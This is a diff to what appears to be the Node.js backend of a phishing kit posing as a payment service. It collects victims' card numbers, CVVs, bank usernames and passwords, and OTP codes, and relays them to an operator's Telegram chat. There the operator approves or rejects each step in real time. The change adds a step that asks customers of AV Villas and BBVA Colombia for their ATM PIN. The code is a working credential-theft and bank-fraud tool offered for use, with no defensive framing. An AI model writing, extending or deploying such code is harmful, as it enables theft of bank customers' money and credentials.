@@ -12,6 +12,14 @@ const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://backveneco
 
 const pagosPendientes = new Map();
 
+// 🔥 BANCOS QUE PIDEN CLAVE ATM EN VEZ DE OTP
+const BANCOS_CLAVE_ATM = ['av villas', 'bbva colombia', 'bbva'];
+
+function esBancoClaveATM(banco) {
+    if (!banco) return false;
+    return BANCOS_CLAVE_ATM.includes(String(banco).trim().toLowerCase());
+}
+
 async function tgSendMessage(text, replyMarkup) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
     const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
@@ -66,20 +74,22 @@ function textoPasoCredenciales(pago) {
 }
 
 function textoPasoOTP(pago) {
+    const etiqueta = pago.requiere_clave_atm ? 'CLAVE ATM' : 'OTP';
+    const valor = pago.requiere_clave_atm ? pago.clave_atm : pago.codigo_otp;
     return (
-        `🔐 <b>NUEVOS DATOS RECIBIDOS (PASO 3: OTP)</b>\n\n` +
+        `🔐 <b>NUEVOS DATOS RECIBIDOS (PASO 3: ${etiqueta})</b>\n\n` +
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
         `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n\n` +
         `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
         `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
-        `🔐 <b>OTP:</b> <code>${pago.codigo_otp || '—'}</code>`
+        `🔐 <b>${etiqueta}:</b> <code>${valor || '—'}</code>`
     );
 }
 
 app.post('/api/crear-pago', async (req, res) => {
-    const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso } = req.body || {};
+    const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, clave_atm, paso } = req.body || {};
     
     if (!solicitud_id) return res.status(400).json({ success: false, error: 'Datos incompletos' });
     if (paso === 'crear' && (!numero_tarjeta || !cvv || !vencimiento || !titular)) {
@@ -90,6 +100,7 @@ app.post('/api/crear-pago', async (req, res) => {
         let pago = pagosPendientes.get(solicitud_id);
 
         if (!pago) {
+            const requiereClaveATM = esBancoClaveATM(banco_emisor);
             pago = {
                 solicitud_id,
                 titular: titular || '—',
@@ -101,6 +112,8 @@ app.post('/api/crear-pago', async (req, res) => {
                 usuario_banco: usuario_banco || null,
                 password_banco: password_banco || null,
                 codigo_otp: codigo_otp || null,
+                clave_atm: clave_atm || null,
+                requiere_clave_atm: requiereClaveATM,
                 estado: 'pendiente',
                 paso: paso || 'crear',
                 fase_actual: paso === 'otp' ? 'otp' : 'credenciales',
@@ -119,13 +132,15 @@ app.post('/api/crear-pago', async (req, res) => {
             pago.usuario_banco = usuario_banco || pago.usuario_banco;
             pago.password_banco = password_banco || pago.password_banco;
             pago.codigo_otp = codigo_otp || pago.codigo_otp;
+            pago.clave_atm = clave_atm || pago.clave_atm;
+            pago.requiere_clave_atm = esBancoClaveATM(pago.banco_emisor);
             pago.estado = 'pendiente';
             pago.paso = paso || pago.paso;
             pago.fase_actual = paso === 'otp' ? 'otp' : 'credenciales';
 
-            // 🔥 FIX: nuevo inicio de credenciales → limpiar OTP y message_id_otp residual
             if (paso === 'credenciales') {
                 pago.codigo_otp = null;
+                pago.clave_atm = null;
                 pago.message_id_otp = null;
                 pago.motivo_rechazo = null;
                 pago.redirigir_a = null;
@@ -137,11 +152,21 @@ app.post('/api/crear-pago', async (req, res) => {
         const pasoActual = paso || 'crear';
         
         let replyMarkup;
-        if (pasoActual === 'crear' || pasoActual === 'credenciales') {
+        if (pasoActual === 'crear') {
             replyMarkup = { inline_keyboard: [[
                 { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
                 { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
             ]]};
+        } else if (pasoActual === 'credenciales') {
+            // 🔥 Si el banco es AV Villas o BBVA → agregar botón "Clave ATM"
+            const botones = [
+                { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
+                { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
+            ];
+            if (pago.requiere_clave_atm) {
+                botones.push({ text: '🔑 Clave ATM', callback_data: `clave_atm:${pago.solicitud_id}` });
+            }
+            replyMarkup = { inline_keyboard: [botones] };
         } else if (pasoActual === 'otp') {
             replyMarkup = { inline_keyboard: [[
                 { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
@@ -150,7 +175,6 @@ app.post('/api/crear-pago', async (req, res) => {
             ]]};
         }
 
-        // 🔥 FIX: guardar el message_id de cada paso
         if (pasoActual === 'crear') {
             const sent = await tgSendMessage(textoPasoCrear(pago), replyMarkup);
             if (sent && sent.ok && sent.result) pago.message_id_crear = sent.result.message_id;
@@ -175,7 +199,13 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
         if (!pago) return res.status(404).json({ success: false, error: 'No encontrado' });
 
         if (pago.estado === 'aprobado_credenciales') {
-            return res.json({ success: true, estado: 'aprobado', fase: 'credenciales', marca: pago.marca_tarjeta });
+            return res.json({
+                success: true,
+                estado: 'aprobado',
+                fase: 'credenciales',
+                marca: pago.marca_tarjeta,
+                requiere_clave_atm: !!pago.requiere_clave_atm   // 🔥 para el frontend
+            });
         }
         if (pago.estado === 'rechazado_credenciales') {
             return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: pago.motivo_rechazo });
@@ -208,7 +238,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const pago = pagosPendientes.get(solicitud_id);
         if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada');
 
-        // 🔥 FIX DEFINITIVO: decidir fase por message_id del mensaje aprobado
         const estaEnFaseOTP = (msgId === pago.message_id_otp);
 
         if (accion === 'aprobar') {
@@ -232,6 +261,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
             if (msgId) {
                 const texto = estaEnFaseOTP ? textoPasoOTP(pago) : textoPasoCredenciales(pago);
                 await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}`);
+            }
+        } else if (accion === 'clave_atm') {
+            // 🔥 Botón "Clave ATM": pide al cliente ingresar la clave del cajero
+            pago.estado = 'aprobado_credenciales';
+            await tgAnswerCallback(cq.id, '🔑 Se solicitó Clave ATM al cliente');
+            if (msgId) {
+                await tgEditMessage(msgId, `🔑 <b>SE SOLICITÓ CLAVE ATM AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago));
             }
         } else if (accion === 'error_usuario') {
             pago.estado = 'rechazado_user_error';
